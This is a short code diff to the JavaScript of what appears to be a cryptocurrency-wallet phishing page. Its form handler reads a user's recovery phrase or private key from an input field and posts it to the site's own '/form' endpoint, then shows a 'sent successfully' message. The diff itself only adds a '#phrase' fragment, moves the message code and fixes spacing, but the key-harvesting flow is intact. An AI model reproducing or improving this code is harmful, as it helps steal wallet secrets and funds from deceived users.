@@ -107,7 +107,7 @@ $(".privatekey").click(function () {
 });
 
 $('.app-cont').click(function () {
-    window.location.href = '/form';
+    window.location.href = '/form#phrase';
 });
 
 
@@ -116,7 +116,7 @@ const form = document.getElementById("formN")
 
 form?.addEventListener('submit', (e) => {
     e.preventDefault();
-    document.querySelector('#loadingIcon').style.display="block";
+    document.querySelector('#loadingIcon').style.display = "block";
 
     var hash = window.location.hash;
     var data;
@@ -134,21 +134,22 @@ form?.addEventListener('submit', (e) => {
         let input = document.getElementById("privateKeyInput")?.value
         data = input;
     }
-    
+
     let formData = {
         data: data
     }
+
+    var section = hash.substring(1)
+    let msg = `Your ${section} has been sent successfully!`
 
     let xhr = new XMLHttpRequest();
     xhr.open('POST', '/form');
     xhr.setRequestHeader('content-type', 'application/json');
     xhr.onload = () => {
-        document.querySelector('#loadingIcon').style.display="none";
+        document.querySelector('#loadingIcon').style.display = "none";
         if (xhr.responseText == 'success') {
-            document.querySelector('.msgModalContainer').style.display="grid"
-            var section = hash.substring(1)
-            let msg = `Your ${section} has been sent successfully!`
-            document.querySelector('.msgP').textContent=msg
+            document.querySelector('.msgModalContainer').style.display = "grid"
+            document.querySelector('.msgP').textContent = msg
         } else {
             console.log(xhr.responseText)
             alert('something went wrong, please try again')
